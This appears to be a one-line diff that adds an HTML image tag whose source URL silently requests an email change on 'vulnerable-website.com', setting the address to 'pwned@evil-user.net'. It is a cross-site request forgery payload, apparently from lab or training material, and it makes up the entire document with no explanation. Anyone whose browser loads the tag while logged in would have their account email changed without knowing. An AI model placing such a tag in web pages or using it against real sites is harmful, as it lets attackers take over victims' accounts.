@@ -1,0 +1,1 @@
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
